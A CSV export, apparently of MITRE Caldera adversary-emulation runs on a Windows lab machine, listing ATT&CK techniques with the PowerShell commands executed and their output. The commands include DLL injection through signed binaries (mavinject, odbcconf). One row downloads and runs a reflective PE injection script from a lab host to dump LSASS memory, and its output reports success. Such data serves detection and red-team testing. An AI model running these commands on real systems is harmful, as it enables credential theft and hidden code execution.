49,Initial-Success,collection,collection :: Process Discovery,collection :: ['SysInternals PSTool Process Discovery'],collection :: T1057,operation__stockpile_windows_depfalse_pshtrue__t1057__collection__process_discovery__cc191baa-7472-4386-a2f4-42f203f1acfd__SAVED_2024-03-09_183401,stockpile_windows_depfalse_pshtrue__t1057__collection__process_discovery__cc191baa-7472-4386-a2f4-42f203f1acfd,['cc191baa-7472-4386-a2f4-42f203f1acfd'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$ps_url = ""https://download.sysinternals.com/files/PSTools.zip"";$download_folder = ""C:\\Users\\Public\\"";$staging_folder = ""C:\\Users\\Public\\temp"";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder""PSTools.zip"" -DestinationPath $staging_folder;iex $staging_folder""\\pslist.exe"" >> $env:LOCALAPPDATA\\output.log;Remove-Item $download_folder""PSTools.zip"";Remove-Item $staging_folder -Recurse']",['Process discovery via SysInternals pstool'],['SysInternals PSTool Process Discovery'],"[{'tactic': 'collection', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}]",['windows'],['psh']
50,Initial-Success,defense-evasion,defense-evasion :: Process Injection: Portable Executable Injection,defense-evasion :: ['Signed Binary Execution - Mavinject'],defense-evasion :: T1055.002,operation__stockpile_windows_depfalse_pshtrue__t1055_002__defense-evasion__process_injection-_portable_executable_injection__e5bcefee-262d-4568-a261-e8a20855ec81__SAVED_2024-03-09_182503,stockpile_windows_depfalse_pshtrue__t1055_002__defense-evasion__process_injection-_portable_executable_injection__e5bcefee-262d-4568-a261-e8a20855ec81,['e5bcefee-262d-4568-a261-e8a20855ec81'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['$explorer = Get-Process -Name explorer;mavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll'],['Leverage Mavinject (signed binary) for DLL injection'],['Signed Binary Execution - Mavinject'],"[{'tactic': 'defense-evasion', 'technique_name': 'Process Injection: Portable Executable Injection', 'technique_id': 'T1055.002'}]",['windows'],['psh']
51,Initial-Success,credential-access,credential-access :: Process Injection: Portable Executable Injection,credential-access :: ['Inject Cred dumper into process (Spookier)'],credential-access :: T1055.002,operation__stockpile_windows_depfalse_pshtrue__t1055_002__credential-access__process_injection-_portable_executable_injection__c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7__SAVED_2024-03-09_181605,stockpile_windows_depfalse_pshtrue__t1055_002__credential-access__process_injection-_portable_executable_injection__c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7,['c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7'],1,1,1,[0],"[""VERBOSE: PowerShell ProcessID: 3920VERBOSE: Calling Invoke-MemoryLoadLibraryVERBOSE: Getting basic PE information from the fileVERBOSE: Allocating memory for the PE and write its headers to memoryVERBOSE: Getting detailed PE information from the headers loaded in memoryVERBOSE: StartAddress: 0x00000251C2850000    EndAddress: 0x00000251C2A30000VERBOSE: Copy PE sections in to memoryVERBOSE: Update memory addresses based on where the PE was actually loaded in memoryVERBOSE: Import DLL's needed by the PE we are loadingVERBOSE: Done importing DLL importsVERBOSE: Update memory protection flagsVERBOSE: Calling dllmain so the DLL knows it has been loadedVERBOSE: Calling function with Void return type[ ] Starting Enum-DumpProcessMemory[ ] Find LSASS[-] PID            : 668[-] Process Handle : 2880[-] File Handle    : 2892[+] Process memory dump successfulVERBOSE: Done unloading the libraries needed by the PEVERBOSE: Calling dllmain so the DLL knows it is being unloadedVERBOSE: Done!""]",[''],['0'],"['$url=""http://192.168.122.1:8888/file/download"";$wc=New-Object System.Net.WebClient;$wc.Headers.add(""file"",""debugger.dll"");$PBytes = $wc.DownloadData($url);$wc1 = New-Object System.net.webclient;$wc1.headers.add(""file"",""Invoke-ReflectivePEInjection.ps1"");IEX ($wc1.DownloadString($url));Invoke-ReflectivePEInjection -PBytes $PBytes -verbose']",['Injects cred dumper exe into an available process'],['Inject Cred dumper into process (Spookier)'],"[{'tactic': 'credential-access', 'technique_name': 'Process Injection: Portable Executable Injection', 'technique_id': 'T1055.002'}]",['windows'],['psh']
52,Initial-Success,defense-evasion,defense-evasion :: Process Injection: Dynamic-link Library Injection,defense-evasion :: ['Signed Binary Execution - odbcconf'],defense-evasion :: T1055.001,operation__stockpile_windows_depfalse_pshtrue__t1055_001__defense-evasion__process_injection-_dynamic-link_library_injection__a74bc239-a196-4f7e-8d5c-fe8c0266071c__SAVED_2024-03-09_180658,stockpile_windows_depfalse_pshtrue__t1055_001__defense-evasion__process_injection-_dynamic-link_library_injection__a74bc239-a196-4f7e-8d5c-fe8c0266071c,['a74bc239-a196-4f7e-8d5c-fe8c0266071c'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['odbcconf.exe /S /A {REGSVR ""C:\\Users\\Public\\sandcat.dll""}']",['Leverage odbcconf for DLL injection'],['Signed Binary Execution - odbcconf'],"[{'tactic': 'defense-evasion', 'technique_name': 'Process Injection: Dynamic-link Library Injection', 'technique_id': 'T1055.001'}]",['windows'],['psh']
53,Initial-Success,discovery,discovery :: System Network Connections Discovery,discovery :: ['Find System Network Connections'],discovery :: T1049,operation__stockpile_windows_depfalse_pshtrue__t1049__discovery__system_network_connections_discovery__638fb6bb-ba39-4285-93d1-7e4775b033a8__SAVED_2024-03-09_175805,stockpile_windows_depfalse_pshtrue__t1049__discovery__system_network_connections_discovery__638fb6bb-ba39-4285-93d1-7e4775b033a8,['638fb6bb-ba39-4285-93d1-7e4775b033a8'],1,1,1,[0],['Active Connections  Proto  Local Address          Foreign Address        State           PID      Offload State  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2976\tInHost        TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       892\tInHost        TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\tInHost        TCP    0.0.0.0:5000           0.0.0.0:0              LISTENING       1800\tInHost        TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       2840\tInHost        TCP    0.0.0.0:5444           0.0.0.0:0              LISTENING       8708\tInHost        TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       8660\tInHost        TCP    0.0.0.0:9900           0.0.0.0:0              LISTENING       7084\tInHost        TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       668\tInHost        TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       520\tInHost        TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1256\tInHost        TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1128\tInHost        TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2108\tInHost        TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       640\tInHost        TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2672\tInHost        TCP    127.0.0.1:9600         0.0.0.0:0              LISTENING       8708\tInHost        TCP    127.0.0.1:49687        127.0.0.1:49688        ESTABLISHED     1800\tInHost        TCP    127.0.0.1:49688        127.0.0.1:49687        ESTABLISHED     1800\tInHost        TCP    192.168.122.229:139    0.0.0.0:0              LISTENING       4\tInHost        TCP    192.168.122.229:49681  23.48.224.111:443      FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49692  72.21.81.200:443       FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49694  204.79.197.222:443     FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49713  51.116.253.169:443     FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49716  13.107.3.254:443       FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49717  20.115.155.233:443     FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49723  204.79.197.200:443     FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49724  20.190.151.68:443      FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49727  13.107.18.254:443      FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49728  13.107.6.163:443       FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49729  4.150.241.254:443      FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49732  13.107.138.254:443     FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49733  13.107.253.254:443     FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49734  13.107.246.40:443      FIN_WAIT_1      5492\tInHost        TCP    192.168.122.229:49763  13.85.23.206:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49766  23.222.242.26:80       ESTABLISHED     5812\tInHost        TCP    192.168.122.229:49767  104.66.243.145:80      TIME_WAIT       0\tInHost        TCP    192.168.122.229:49769  52.159.126.152:443     ESTABLISHED     3016\tInHost        TCP    192.168.122.229:49774  23.222.242.26:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49775  23.222.242.26:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49776  52.137.106.217:443     TIME_WAIT       0\tInHost        TCP    192.168.122.229:49796  52.191.219.104:443     TIME_WAIT       0\tInHost        TCP    192.168.122.229:49800  52.191.219.104:443     TIME_WAIT       0\tInHost        TCP    192.168.122.229:49803  52.191.219.104:443     TIME_WAIT       0\tInHost        TCP    192.168.122.229:49804  128.226.117.212:9200   ESTABLISHED     8708\tInHost        TCP    192.168.122.229:49806  13.85.23.206:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49809  23.196.238.71:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49811  20.42.65.85:443        TIME_WAIT       0\tInHost        TCP    192.168.122.229:49812  20.7.47.135:443        ESTABLISHED     1176\tInHost        TCP    192.168.122.229:49813  20.54.24.246:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49814  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49816  23.44.133.39:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49817  23.44.133.53:80        TIME_WAIT       0\tInHost        TCP    192.168.122.229:49818  23.44.133.57:80        TIME_WAIT       0\tInHost        TCP    192.168.122.229:49819  13.85.23.86:443        TIME_WAIT       0\tInHost        TCP    192.168.122.229:49820  13.107.21.200:443      ESTABLISHED     5492\tInHost        TCP    192.168.122.229:49822  13.85.23.206:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49825  20.42.65.85:443        TIME_WAIT       0\tInHost        TCP    192.168.122.229:49830  20.42.65.85:443        ESTABLISHED     2760\tInHost        TCP    192.168.122.229:49831  20.3.187.198:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49832  52.96.182.98:443       ESTABLISHED     8208\tInHost        TCP    192.168.122.229:49833  23.216.132.18:443      ESTABLISHED     4776\tInHost        TCP    192.168.122.229:49840  20.231.121.79:80       ESTABLISHED     2344\tInHost        TCP    192.168.122.229:49841  10.32.139.114:1100     TIME_WAIT       0\tInHost        TCP    192.168.122.229:49842  192.168.122.1:8888     ESTABLISHED     3152\tInHost        TCP    192.168.122.229:49843  40.119.46.46:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49844  40.119.46.46:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49845  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49846  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49847  23.44.133.60:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49848  23.44.133.167:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49849  23.44.133.178:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49850  40.119.46.46:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49851  23.44.133.167:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49852  23.44.133.146:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49853  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49854  23.44.133.60:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49855  69.164.46.128:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49856  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49857  23.44.133.60:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49858  23.44.133.146:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49859  23.44.133.178:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49861  23.44.133.167:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49862  23.44.133.146:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49863  20.3.187.198:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49864  69.164.46.128:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49865  23.44.133.178:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49866  23.44.133.167:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49867  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49868  23.44.133.60:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49869  72.21.81.240:80        TIME_WAIT       0\tInHost        TCP    192.168.122.229:49871  72.21.81.240:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49873  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49874  23.44.133.60:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49875  23.44.133.146:80       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49876  23.44.133.178:80       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49877  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49878  52.184.216.246:443     ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49879  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49880  23.44.133.60:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49881  23.44.133.167:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49882  23.44.133.146:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49883  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49884  23.44.133.178:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49885  23.44.133.167:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49886  20.3.187.198:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49890  23.44.133.167:80       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49891  23.44.133.178:80       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49893  52.183.220.149:443     TIME_WAIT       0\tInHost        TCP    192.168.122.229:49894  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49895  23.44.133.60:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49896  23.44.133.146:80       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49897  23.44.133.178:80       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49901  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49902  23.44.133.60:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49903  23.44.133.167:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49904  23.44.133.146:80       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49905  40.119.46.46:443       TIME_WAIT       0\tInHost        TCP    192.168.122.229:49907  23.217.42.68:443       ESTABLISHED     3380\tInHost        TCP    192.168.122.229:49908  69.164.46.128:80       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49909  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49911  23.44.133.60:80        ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49912  23.44.133.178:80       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49913  23.44.133.167:80       ESTABLISHED     8660\tInHost        TCP    192.168.122.229:49914  23.39.33.176:443       ESTABLISHED     8660\tInHost        TCP    [::]:22                [::]:0                 LISTENING       2976\tInHost        TCP    [::]:135               [::]:0                 LISTENING       892\tInHost        TCP    [::]:445               [::]:0                 LISTENING       4\tInHost        TCP    [::]:5444              [::]:0                 LISTENING       8708\tInHost        TCP    [::]:7680              [::]:0                 LISTENING       8660\tInHost        TCP    [::]:49664             [::]:0                 LISTENING       668\tInHost        TCP    [::]:49665             [::]:0                 LISTENING       520\tInHost        TCP    [::]:49666             [::]:0                 LISTENING       1256\tInHost        TCP    [::]:49667             [::]:0                 LISTENING       1128\tInHost        TCP    [::]:49668             [::]:0                 LISTENING       2108\tInHost        TCP    [::]:49669             [::]:0                 LISTENING       640\tInHost        TCP    [::]:49670             [::]:0                 LISTENING       2672\tInHost        TCP    [::1]:5444             [::1]:49834            ESTABLISHED     8708\tInHost        TCP    [::1]:5444             [::1]:49835            ESTABLISHED     8708\tInHost        TCP    [::1]:5444             [::1]:49836            ESTABLISHED     8708\tInHost        TCP    [::1]:5444             [::1]:49837            ESTABLISHED     8708\tInHost        TCP    [::1]:49834            [::1]:5444             ESTABLISHED     6588\tInHost        TCP    [::1]:49835            [::1]:5444             ESTABLISHED     6588\tInHost        TCP    [::1]:49836            [::1]:5444             ESTABLISHED     6588\tInHost        TCP    [::1]:49837            [::1]:5444             ESTABLISHED     6588\tInHost        UDP    0.0.0.0:123            *:*                                    6548\t              UDP    0.0.0.0:500            *:*                                    2660\t              UDP    0.0.0.0:3702           *:*                                    3092\t              UDP    0.0.0.0:3702           *:*                                    3092\t              UDP    0.0.0.0:4500           *:*                                    2660\t              UDP    0.0.0.0:5050           *:*                                    2840\t              UDP    0.0.0.0:5353           *:*                                    1964\t              UDP    0.0.0.0:5355           *:*                                    1964\t              UDP    0.0.0.0:51567          *:*                                    3092\t              UDP    127.0.0.1:1900         *:*                                    3452\t              UDP    127.0.0.1:55501        *:*                                    3452\t              UDP    127.0.0.1:64221        *:*                                    2652\t              UDP    192.168.122.229:137    *:*                                    4\t              UDP    192.168.122.229:138    *:*                                    4\t              UDP    192.168.122.229:1900   *:*                                    3452\t              UDP    192.168.122.229:55500  *:*                                    3452\t              UDP    [::]:123               *:*                                    6548\t              UDP    [::]:500               *:*                                    2660\t              UDP    [::]:3702              *:*                                    3092\t              UDP    [::]:3702              *:*                                    3092\t              UDP    [::]:4500              *:*                                    2660\t              UDP    [::]:5353              *:*                                    1964\t              UDP    [::]:5355              *:*                                    1964\t              UDP    [::]:51568             *:*                                    3092\t              UDP    [::1]:1900             *:*                                    3452\t              UDP    [::1]:55499            *:*                                    3452\t              UDP    [fe80::7ce:18e0:9115:ab55%9]:1900  *:*                                    3452\t              UDP    [fe80::7ce:18e0:9115:ab55%9]:55498  *:*                                    3452\t            LocalAddress                        LocalPort RemoteAddress                       RemotePort State       AppliedSetting------------                        --------- -------------                       ---------- -----       --------------::                                  49837     ::                                  0          Bound                     ::                                  49836     ::                                  0          Bound                     ::                                  49835     ::                                  0          Bound                     ::                                  49834     ::                                  0          Bound                     ::                                  49804     ::                                  0          Bound                     ::1                                 49837     ::1                                 5444       Established Internet      ::1                                 49836     ::1                                 5444       Established Internet      ::1                                 49835     ::1                                 5444       Established Internet      ::1                                 49834     ::1                                 5444       Established Internet      ::                                  49670     ::                                  0          Listen                    ::                                  49669     ::                                  0          Listen                    ::                                  49668     ::                                  0          Listen                    ::                                  49667     ::                                  0          Listen                    ::                                  49666     ::                                  0          Listen                    ::                                  49665     ::                                  0          Listen                    ::                                  49664     ::                                  0          Listen                    ::                                  7680      ::                                  0          Listen                    ::1                                 5444      ::1                                 49837      Established Internet      ::1                                 5444      ::1                                 49836      Established Internet      ::1                                 5444      ::1                                 49835      Established Internet      ::1                                 5444      ::1                                 49834      Established Internet      ::                                  5444      ::                                  0          Listen                    ::                                  445       ::                                  0          Listen                    ::                                  135       ::                                  0          Listen                    ::                                  22        ::                                  0          Listen                    0.0.0.0                             49914     0.0.0.0                             0          Bound                     0.0.0.0                             49913     0.0.0.0                             0          Bound                     0.0.0.0                             49912     0.0.0.0                             0          Bound                     0.0.0.0                             49911     0.0.0.0                             0          Bound                     0.0.0.0                             49909     0.0.0.0                             0          Bound                     0.0.0.0                             49908     0.0.0.0                             0          Bound                     0.0.0.0                             49907     0.0.0.0                             0          Bound                     0.0.0.0                             49902     0.0.0.0                             0          Bound                     0.0.0.0                             49901     0.0.0.0                             0          Bound                     0.0.0.0                             49897     0.0.0.0                             0          Bound                     0.0.0.0                             49896     0.0.0.0                             0          Bound                     0.0.0.0                             49895     0.0.0.0                             0          Bound                     0.0.0.0                             49894     0.0.0.0                             0          Bound                     0.0.0.0                             49891     0.0.0.0                             0          Bound                     0.0.0.0                             49890     0.0.0.0                             0          Bound                     0.0.0.0                             49883     0.0.0.0                             0          Bound                     0.0.0.0                             49880     0.0.0.0                             0          Bound                     0.0.0.0                             49879     0.0.0.0                             0          Bound                     0.0.0.0                             49878     0.0.0.0                             0          Bound                     0.0.0.0                             49877     0.0.0.0                             0          Bound                     0.0.0.0                             49876     0.0.0.0                             0          Bound                     0.0.0.0                             49875     0.0.0.0                             0          Bound                     0.0.0.0                             49874     0.0.0.0                             0          Bound                     0.0.0.0                             49873     0.0.0.0                             0          Bound                     0.0.0.0                             49871     0.0.0.0                             0          Bound                     0.0.0.0                             49868     0.0.0.0                             0          Bound                     0.0.0.0                             49867     0.0.0.0                             0          Bound                     0.0.0.0                             49857     0.0.0.0                             0          Bound                     0.0.0.0                             49856     0.0.0.0                             0          Bound                     0.0.0.0                             49854     0.0.0.0                             0          Bound                     0.0.0.0                             49853     0.0.0.0                             0          Bound                     0.0.0.0                             49847     0.0.0.0                             0          Bound                     0.0.0.0                             49846     0.0.0.0                             0          Bound                     0.0.0.0                             49845     0.0.0.0                             0          Bound                     0.0.0.0                             49842     0.0.0.0                             0          Bound                     0.0.0.0                             49840     0.0.0.0                             0          Bound                     0.0.0.0                             49833     0.0.0.0                             0          Bound                     0.0.0.0                             49832     0.0.0.0                             0          Bound                     0.0.0.0                             49830     0.0.0.0                             0          Bound                     0.0.0.0                             49820     0.0.0.0                             0          Bound                     0.0.0.0                             49816     0.0.0.0                             0          Bound                     0.0.0.0                             49814     0.0.0.0                             0          Bound                     0.0.0.0                             49812     0.0.0.0                             0          Bound                     0.0.0.0                             49769     0.0.0.0                             0          Bound                     0.0.0.0                             49766     0.0.0.0                             0          Bound                     0.0.0.0                             49688     0.0.0.0                             0          Bound                     192.168.122.229                     49914     23.39.33.176                        443        Established Internet      192.168.122.229                     49913     23.44.133.167                       80         Established Internet      192.168.122.229                     49912     23.44.133.178                       80         Established Internet      192.168.122.229                     49911     23.44.133.60                        80         Established Internet      192.168.122.229                     49909     23.39.33.176                        443        Established Internet      192.168.122.229                     49908     69.164.46.128                       80         Established Internet      192.168.122.229                     49907     23.217.42.68                        443        Established Internet      192.168.122.229                     49905     40.119.46.46                        443        TimeWait                  192.168.122.229                     49904     23.44.133.146                       80         TimeWait                  192.168.122.229                     49903     23.44.133.167                       80         TimeWait                  192.168.122.229                     49902     23.44.133.60                        80         Established Internet      192.168.122.229                     49901     23.39.33.176                        443        Established Internet      192.168.122.229                     49897     23.44.133.178                       80         Established Internet      192.168.122.229                     49896     23.44.133.146                       80         Established Internet      192.168.122.229                     49895     23.44.133.60                        80         Established Internet      192.168.122.229                     49894     23.39.33.176                        443        Established Internet      192.168.122.229                     49893     52.183.220.149                      443        TimeWait                  192.168.122.229                     49891     23.44.133.178                       80         Established Internet      192.168.122.229                     49890     23.44.133.167                       80         Established Internet      192.168.122.229                     49886     20.3.187.198                        443        TimeWait                  192.168.122.229                     49885     23.44.133.167                       80         TimeWait                  192.168.122.229                     49884     23.44.133.178                       80         TimeWait                  192.168.122.229                     49883     23.39.33.176                        443        Established Internet      192.168.122.229                     49882     23.44.133.146                       80         TimeWait                  192.168.122.229                     49881     23.44.133.167                       80         TimeWait                  192.168.122.229                     49880     23.44.133.60                        80         Established Internet      192.168.122.229                     49879     23.39.33.176                        443        Established Internet      192.168.122.229                     49878     52.184.216.246                      443        Established Internet      192.168.122.229                     49877     23.39.33.176                        443        Established Internet      192.168.122.229                     49876     23.44.133.178                       80         Established Internet      192.168.122.229                     49875     23.44.133.146                       80         Established Internet      192.168.122.229                     49874     23.44.133.60                        80         Established Internet      192.168.122.229                     49873     23.39.33.176                        443        Established Internet      192.168.122.229                     49871     72.21.81.240                        80         Established Internet      192.168.122.229                     49869     72.21.81.240                        80         TimeWait                  192.168.122.229                     49868     23.44.133.60                        80         Established Internet      192.168.122.229                     49867     23.39.33.176                        443        Established Internet      192.168.122.229                     49866     23.44.133.167                       80         TimeWait                  192.168.122.229                     49865     23.44.133.178                       80         TimeWait                  192.168.122.229                     49864     69.164.46.128                       80         TimeWait                  192.168.122.229                     49863     20.3.187.198                        443        TimeWait                  192.168.122.229                     49862     23.44.133.146                       80         TimeWait                  192.168.122.229                     49861     23.44.133.167                       80         TimeWait                  192.168.122.229                     49859     23.44.133.178                       80         TimeWait                  192.168.122.229                     49858     23.44.133.146                       80         TimeWait                  192.168.122.229                     49857     23.44.133.60                        80         Established Internet      192.168.122.229                     49856     23.39.33.176                        443        Established Internet      192.168.122.229                     49855     69.164.46.128                       80         TimeWait                  192.168.122.229                     49854     23.44.133.60                        80         Established Internet      192.168.122.229                     49853     23.39.33.176                        443        Established Internet      192.168.122.229                     49852     23.44.133.146                       80         TimeWait                  192.168.122.229                     49851     23.44.133.167                       80         TimeWait                  192.168.122.229                     49850     40.119.46.46                        443        TimeWait                  192.168.122.229                     49849     23.44.133.178                       80         TimeWait                  192.168.122.229                     49848     23.44.133.167                       80         TimeWait                  192.168.122.229                     49847     23.44.133.60                        80         Established Internet      192.168.122.229                     49846     23.39.33.176                        443        Established Internet      192.168.122.229                     49845     23.39.33.176                        443        Established Internet      192.168.122.229                     49844     40.119.46.46                        443        TimeWait                  192.168.122.229                     49843     40.119.46.46                        443        TimeWait                  192.168.122.229                     49842     192.168.122.1                       8888       Established Internet      192.168.122.229                     49841     10.32.139.114                       1100       TimeWait                  192.168.122.229                     49840     20.231.121.79                       80         Established Internet      192.168.122.229                     49833     23.216.132.18                       443        Established Internet      192.168.122.229                     49832     52.96.182.98                        443        Established Internet      192.168.122.229                     49831     20.3.187.198                        443        TimeWait                  192.168.122.229                     49830     20.42.65.85                         443        Established Internet      192.168.122.229                     49825     20.42.65.85                         443        TimeWait                  192.168.122.229                     49822     13.85.23.206                        443        TimeWait                  192.168.122.229                     49820     13.107.21.200                       443        Established Internet      192.168.122.229                     49819     13.85.23.86                         443        TimeWait                  192.168.122.229                     49818     23.44.133.57                        80         TimeWait                  192.168.122.229                     49817     23.44.133.53                        80         TimeWait                  192.168.122.229                     49816     23.44.133.39                        80         Estalished I,[''],['0'],['netstat -anto;Get-NetTCPConnection'],['Find System Network Connections'],['Find System Network Connections'],"[{'tactic': 'discovery', 'technique_name': 'System Network Connections Discovery', 'technique_id': 'T1049'}]",['windows'],['psh']
54,Initial-Success,collection,collection :: WMIC,collection :: ['WMIC Process Enumeration'],collection :: T1047,operation__stockpile_windows_depfalse_pshtrue__t1047__collection__wmic__94f21386-9547-43c4-99df-938ab05d45ce__SAVED_2024-03-09_174914,stockpile_windows_depfalse_pshtrue__t1047__collection__wmic__94f21386-9547-43c4-99df-938ab05d45ce,['94f21386-9547-43c4-99df-938ab05d45ce'],1,1,1,[0],['ExecutablePath                                                                                                                Name                         ParentProcessId  ProcessId                                                                                                                                System Idle Process          0                0                                                                                                                                        System                       0                4                                                                                                                                        Registry                     4                92                                                                                                                                       smss.exe                     4                340                                                                                                                                      csrss.exe                    432              444                                                                                                                                      wininit.exe                  432              520                                                                                                                                      csrss.exe                    512              532        C:\\WINDOWS\\system32\\winlogon.exe                                                                                              winlogon.exe                 512              616                                                                                                                                      services.exe                 520              640        C:\\WINDOWS\\system32\\lsass.exe                                                                                                 lsass.exe                    520              668        C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              776        C:\\WINDOWS\\system32\\fontdrvhost.exe                                                                                           fontdrvhost.exe              616              784        C:\\WINDOWS\\system32\\fontdrvhost.exe                                                                                           fontdrvhost.exe              520              792        C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              892        C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              948        C:\\WINDOWS\\system32\\dwm.exe                                                                                                   dwm.exe                      616              320        C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              740        C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              680        C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              448        C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1028       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              1048       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1128       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1208       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1224       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              1256       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1340       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1372       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1440       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              1576       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1592       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  